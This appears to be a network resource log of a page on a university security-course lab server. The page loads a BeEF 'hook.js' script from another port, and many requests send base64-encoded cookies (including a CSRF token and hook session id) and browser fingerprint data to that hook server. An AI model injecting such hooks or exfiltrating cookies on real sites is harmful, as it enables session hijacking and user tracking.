id	type	url
7ce393d479ab9d17ea6d3f3b12df4af7	Document	http://cs6264.gtisc.gatech.edu:54831/
4fb9f721cd9602953eb246ef435e6de1	Stylesheet	https://use.fontawesome.com/releases/v5.8.1/css/all.css
930baf64e8fd182ae30bbe6cb65d3b45	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/bootstrap.min.css
737c218dac6b4bb866a5d905fdf4af42	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/mdb.min.css
27f0193e00171608a569b341e42d829b	Image	http://cs6264.gtisc.gatech.edu:54831/media/Basketball.png
0f94df48edfd4ac84b851dd36098bef1	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/style.min.css
07daf0298dfda73666124ce8013c5090	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/popper.min.js
5c34852d9a2dcbe9427b35eb54849ff8	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/bootstrap.min.js
734bdf975513a67432628738154f7f4c	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/mdb.min.js
9c4aaacc2c07050c62f3c6ae497cd98d	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Regular.woff2
af59e7ef98e4fad0b761c4d2e63d1329	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Light.woff2
e2d41f72ed4815ccc40ca41a9a1de5d3	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Bold.woff2
121c74d562a338e40f15c052a76c03e4	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js
083c92f77373217509497a4cd9e491dd	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=1&pc=9&d=W3siY2lkIjowLCJyZXN1bHRzIjp7ImJyb3dzZXIud2luZG93LmNvb2tpZXMiOiJjc3JmdG9rZW49QWpRakFpbnRzUEJRQXR0Rm5rd0RyM0FNNVpWUnZTSWY7IEJFRUZIT09LPUtIYnBPMjFYYkQ1Z0R4bXRqY1ZQbGN0MzNuTHZPeFZYaVBSNVRyOEppQUdvWU5PaUpWSGhXV25IR3lFY25LRFFIZE1pc0N3WE5ONkRiS0FyOyBiYWNrX3RvX2FkbWluPWh0dHAlM0EvL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1JTNBNDI4NDUvYWRtaW4vdmlldyUzQW1vZHVsZXMvbG9hZF9tb2R1bGUlM0F1c2Vycy9lZGl0LXVzZXI&_=1763088539512
b9555dc45a759cfefbc2dcb1f10dcd4a	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=3&pc=9&d=dpbnMiOiJQREYgVmlld2VyLENocm9tZSBQREYgVmlld2VyLENocm9taXVtIFBERiBWaWV3ZXIsTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixXZWJLaXQgYnVpbHQtaW4gUERGIiwiYnJvd3Nlci53aW5kb3cudGl0bGUiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cub3JpZ2luIjoiaHR0cDovL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1OjU0ODMxIiwiYnJvd3Nlci53aW5kb3cuaG9zdG5hbWUiOiJjczYyNjQuZ3Rpc2MuZ2F0ZWNoLmVkdSIsImJyb3dzZXIud2luZG93Lmhvc3Rwb3J0IjoiNTQ4MzEiLCJic&_=1763088539514
5e895d961e5c7303e6923deb36afdbfb	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=4&pc=9&d=m93c2VyLndpbmRvdy51cmkiOiJodHRwOi8vY3M2MjY0Lmd0aXNjLmdhdGVjaC5lZHU6NTQ4MzEvIiwiYnJvd3Nlci53aW5kb3cucmVmZXJyZXIiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cuc2l6ZS53aWR0aCI6MTI4MCwiYnJvd3Nlci53aW5kb3cuc2l6ZS5oZWlnaHQiOjEzMjQsImJyb3dzZXIuZGF0ZS5kYXRlc3RhbXAiOiJUaHUgTm92IDEzIDIwMjUgMjE6NDg6NTkgR01ULTA1MDAgKEVhc3Rlcm4gU3RhbmRhcmQgVGltZSkiLCJob3N0Lm9zLm5hbWUiOiJMaW51eCIsImhvc3Qub3MuZmFtaWx5Ijoi&_=1763088539515
41beb4dbfc39de679acb1368870a55c5	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=5&pc=9&d=TGludXgiLCJob3N0Lm9zLmFyY2giOjY0LCJob3N0LnNvZnR3YXJlLmRlZmF1bHRicm93c2VyIjoiVW5rbm93biIsImhhcmR3YXJlLnR5cGUiOiJVbmtub3duIiwiaGFyZHdhcmUubWVtb3J5IjoidW5rbm93biIsImhhcmR3YXJlLmdwdSI6IkFOR0xFIChJbnRlbCwgTWVzYSBJbnRlbChSKSBJcmlzKFIpIFhlIEdyYXBoaWNzIChBREwgR1QyKSwgT3BlbkdMIEVTIDMuMikiLCJoYXJkd2FyZS5ncHUudmVuZG9yIjoiR29vZ2xlIEluYy4gKEludGVsKSIsImhhcmR3YXJlLmNwdS5hcmNoIjoieDg2XzY0IiwiaGF&_=1763088539516
6a46ab635ecfcb3ae798737ff2caab6c	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=6&pc=9&d=yZHdhcmUuY3B1LmNvcmVzIjoyMCwiaGFyZHdhcmUuYmF0dGVyeS5jaGFyZ2luZ3N0YXR1cyI6InVua25vd24iLCJoYXJkd2FyZS5iYXR0ZXJ5LmxldmVsIjoidW5rbm93biIsImhhcmR3YXJlLmJhdHRlcnkuY2hhcmdpbmd0aW1lIjoidW5rbm93biIsImhhcmR3YXJlLmJhdHRlcnkuZGlzY2hhcmdpbmd0aW1lIjoidW5rbm93biIsImhhcmR3YXJlLnNjcmVlbi5zaXplLndpZHRoIjoyNTYwLCJoYXJkd2FyZS5zY3JlZW4uc2l6ZS5oZWlnaHQiOjE0NDAsImhhcmR3YXJlLnNjcmVlbi5jb2xvcmRlcHRoIjoyNC&_=1763088539517
ee09650b345da30e7dc180435cc95f04	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=2&pc=9&d=lM0ExIiwiYnJvd3Nlci5uYW1lIjoiVU5LTk9XTiIsImJyb3dzZXIudmVyc2lvbiI6IjE0Mi4wLjAuMCIsImJyb3dzZXIuZW5naW5lIjoiQmxpbmsiLCJicm93c2VyLm5hbWUucmVwb3J0ZWQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXIucGxhdGZvcm0iOiJMaW51eCB4ODZfNjQiLCJicm93c2VyLmxhbmd1YWdlIjoiZW4tVVMiLCJicm93c2VyLnBsdW&_=1763088539513
539205c4ccdda1cd840014121bfdea4d	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=7&pc=9&d=wiaGFyZHdhcmUuc2NyZWVuLnRvdWNoZW5hYmxlZCI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMudmJzY3JpcHQiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLmZsYXNoIjoiTm8iLCJicm93c2VyLmNhcGFiaWxpdGllcy5zaWx2ZXJsaWdodCI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMucGhvbmVnYXAiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYnNvY2tldCI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYnJ0YyI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYndvc&_=1763088539518
bfc183c90c3f369ef7ca335568311c69	Other	http://cs6264.gtisc.gatech.edu:54831/favicon.ico
b5f119c963a4add4b2acf602d0abc117	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=8&pc=9&d=mtlciI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYmdsIjoiWWVzIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMuZ29vZ2xlZ2VhcnMiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLmFjdGl2ZXgiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLnF1aWNrdGltZSI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMucmVhbHBsYXllciI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMud21wIjoiTm8iLCJicm93c2VyLmNhcGFiaWxpdGllcy52bGMiOiJObyIsIkhvb2tTZXNzaW9uSUQiOiJLSGJwTzIx&_=1763088539519
8b6891ee08ee98523f3ff7fd8e43dac4	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=4&pc=9&d=m93c2VyLndpbmRvdy51cmkiOiJodHRwOi8vY3M2MjY0Lmd0aXNjLmdhdGVjaC5lZHU6NTQ4MzEvIiwiYnJvd3Nlci53aW5kb3cucmVmZXJyZXIiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cuc2l6ZS53aWR0aCI6MTI4MCwiYnJvd3Nlci53aW5kb3cuc2l6ZS5oZWlnaHQiOjEzMjQsImJyb3dzZXIuZGF0ZS5kYXRlc3RhbXAiOiJUaHUgTm92IDEzIDIwMjUgMjE6NDg6NTkgR01ULTA1MDAgKEVhc3Rlcm4gU3RhbmRhcmQgVGltZSkiLCJob3N0Lm9zLm5hbWUiOiJMaW51eCIsImhvc3Qub3MuZmFtaWx5Ijoi&_=1763088539524
d27fa475613438b572ada8d5256718c7	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=9&pc=9&d=WGJENWdEeG10amNWUGxjdDMzbkx2T3hWWGlQUjVUcjhKaUFHb1lOT2lKVkhoV1duSEd5RWNuS0RRSGRNaXNDd1hOTjZEYktBciJ9LCJzdGF0dXMiOjAsImhhbmRsZXIiOiIvaW5pdCJ9XQ%3D%3D&_=1763088539520
140ba86f641f1eda41c57785bbafdf19	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=1&pc=9&d=W3siY2lkIjowLCJyZXN1bHRzIjp7ImJyb3dzZXIud2luZG93LmNvb2tpZXMiOiJjc3JmdG9rZW49QWpRakFpbnRzUEJRQXR0Rm5rd0RyM0FNNVpWUnZTSWY7IEJFRUZIT09LPUtIYnBPMjFYYkQ1Z0R4bXRqY1ZQbGN0MzNuTHZPeFZYaVBSNVRyOEppQUdvWU5PaUpWSGhXV25IR3lFY25LRFFIZE1pc0N3WE5ONkRiS0FyOyBiYWNrX3RvX2FkbWluPWh0dHAlM0EvL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1JTNBNDI4NDUvYWRtaW4vdmlldyUzQW1vZHVsZXMvbG9hZF9tb2R1bGUlM0F1c2Vycy9lZGl0LXVzZXI&_=1763088539521
a535f279ba5f8d3a0171564fcac85368	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=3&pc=9&d=dpbnMiOiJQREYgVmlld2VyLENocm9tZSBQREYgVmlld2VyLENocm9taXVtIFBERiBWaWV3ZXIsTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixXZWJLaXQgYnVpbHQtaW4gUERGIiwiYnJvd3Nlci53aW5kb3cudGl0bGUiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cub3JpZ2luIjoiaHR0cDovL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1OjU0ODMxIiwiYnJvd3Nlci53aW5kb3cuaG9zdG5hbWUiOiJjczYyNjQuZ3Rpc2MuZ2F0ZWNoLmVkdSIsImJyb3dzZXIud2luZG93Lmhvc3Rwb3J0IjoiNTQ4MzEiLCJic&_=1763088539523
00790c14c62d1f5b58645fe8fb9aed32	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=2&pc=9&d=lM0ExIiwiYnJvd3Nlci5uYW1lIjoiVU5LTk9XTiIsImJyb3dzZXIudmVyc2lvbiI6IjE0Mi4wLjAuMCIsImJyb3dzZXIuZW5naW5lIjoiQmxpbmsiLCJicm93c2VyLm5hbWUucmVwb3J0ZWQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXIucGxhdGZvcm0iOiJMaW51eCB4ODZfNjQiLCJicm93c2VyLmxhbmd1YWdlIjoiZW4tVVMiLCJicm93c2VyLnBsdW&_=1763088539522
7b9d5e90a4f95981e91a2c4f04f63b0e	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=5&pc=9&d=TGludXgiLCJob3N0Lm9zLmFyY2giOjY0LCJob3N0LnNvZnR3YXJlLmRlZmF1bHRicm93c2VyIjoiVW5rbm93biIsImhhcmR3YXJlLnR5cGUiOiJVbmtub3duIiwiaGFyZHdhcmUubWVtb3J5IjoidW5rbm93biIsImhhcmR3YXJlLmdwdSI6IkFOR0xFIChJbnRlbCwgTWVzYSBJbnRlbChSKSBJcmlzKFIpIFhlIEdyYXBoaWNzIChBREwgR1QyKSwgT3BlbkdMIEVTIDMuMikiLCJoYXJkd2FyZS5ncHUudmVuZG9yIjoiR29vZ2xlIEluYy4gKEludGVsKSIsImhhcmR3YXJlLmNwdS5hcmNoIjoieDg2XzY0IiwiaGF&_=1763088539525
dc1e5a1e022314a6c4f3b11821e2b6c6	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539530
43c00b4dfc872c83d7342a09be32d62a	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=9&pc=9&d=WGJENWdEeG10amNWUGxjdDMzbkx2T3hWWGlQUjVUcjhKaUFHb1lOT2lKVkhoV1duSEd5RWNuS0RRSGRNaXNDd1hOTjZEYktBciJ9LCJzdGF0dXMiOjAsImhhbmRsZXIiOiIvaW5pdCJ9XQ%3D%3D&_=1763088539529
b7a9cb2763e45d562ccf664d4a757800	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=6&pc=9&d=yZHdhcmUuY3B1LmNvcmVzIjoyMCwiaGFyZHdhcmUuYmF0dGVyeS5jaGFyZ2luZ3N0YXR1cyI6InVua25vd24iLCJoYXJkd2FyZS5iYXR0ZXJ5LmxldmVsIjoidW5rbm93biIsImhhcmR3YXJlLmJhdHRlcnkuY2hhcmdpbmd0aW1lIjoidW5rbm93biIsImhhcmR3YXJlLmJhdHRlcnkuZGlzY2hhcmdpbmd0aW1lIjoidW5rbm93biIsImhhcmR3YXJlLnNjcmVlbi5zaXplLndpZHRoIjoyNTYwLCJoYXJkd2FyZS5zY3JlZW4uc2l6ZS5oZWlnaHQiOjE0NDAsImhhcmR3YXJlLnNjcmVlbi5jb2xvcmRlcHRoIjoyNC&_=1763088539526
1f133faa24f9238a3dd0fe921d715b05	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=8&pc=9&d=mtlciI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYmdsIjoiWWVzIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMuZ29vZ2xlZ2VhcnMiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLmFjdGl2ZXgiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLnF1aWNrdGltZSI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMucmVhbHBsYXllciI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMud21wIjoiTm8iLCJicm93c2VyLmNhcGFiaWxpdGllcy52bGMiOiJObyIsIkhvb2tTZXNzaW9uSUQiOiJLSGJwTzIx&_=1763088539528
2ed832ee2549edfd6a3f02c709c4abe4	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=2&pid=7&pc=9&d=wiaGFyZHdhcmUuc2NyZWVuLnRvdWNoZW5hYmxlZCI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMudmJzY3JpcHQiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLmZsYXNoIjoiTm8iLCJicm93c2VyLmNhcGFiaWxpdGllcy5zaWx2ZXJsaWdodCI6Ik5vIiwiYnJvd3Nlci5jYXBhYmlsaXRpZXMucGhvbmVnYXAiOiJObyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYnNvY2tldCI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYnJ0YyI6IlllcyIsImJyb3dzZXIuY2FwYWJpbGl0aWVzLndlYndvc&_=1763088539527
b156c41502d20aa516cd59f0652ffb97	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539531
f877397b8b0047103e3f8e7b8b5b6547	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539532
8d241cea9b7f133430e64a82643b0ee6	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539533
19a7eb61d91290434050b7159b9aa51c	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539534
bf4f65459f6768bd3c347c9d580af3f8	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539535
fbd3837a1e4ff98a7fffeafbf3f8e73e	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539536
032f2aa2961a9296218e21b307b41b05	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539537
3d0d414d287396a554673c20a24f241b	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539538
60cfcd79cf4b7ac78fcc8324f754146b	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539539
ea1c8029bb2ee4038651865d6e83428f	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539540
6a4c3a6f31cac997d8510e2df75f0ff8	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539541
8f9c304c7902ad7a36daed97561575cb	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539542
b59b67fc974ebea3a900467b59c76f25	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539543
fdcacfff60c493682e614bfdf7312b12	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539544
c8341b07a91dc222b78b5d64e02234fd	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539545
ab5b34c5993f061296ab9485a4adf718	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539546
c0a4f9cf758134a420094d8445038a4a	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539547
0ffe2e12c6349bf78a84e1b078cfde72	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539548
3c782e7438198a0337adc634e4e3a352	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539549
466ffce060390764942f774ceaf88f5a	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539550
e6605a2e8f49bafba947fe4395edb67b	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539551
c291ec2d03bb93ab321eaeaa340ddc8c	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539552
f6a411c8a9a18e2e62330aacec602dae	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539553
1974c00fc211d1a4ac67044d3eb14c13	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539554
2d37af93e5e9f5ff7803df0ebfdec1f5	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539555
0b7571dd5f154295d0a0f4758b0dafb1	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539556
e1337ce171b7baa950e46488a0a354d0	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539557
d21c9e22b89e34fa79dbb59dc0239ae3	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539558
73a97a840d3e222e5e7b672e6a86d665	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539559
941592ca5b82ce8a0faf60bdc3e6aea3	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539560
e92f05830e5f773ccdb808fa73701178	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539561
b3c70d912e020c5f9bf49c84f6366d29	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539562
168f795ad5e71b19995fc3176fa68208	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539563
d8ffbe40bd871831a9bd46e69e3abee2	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539564
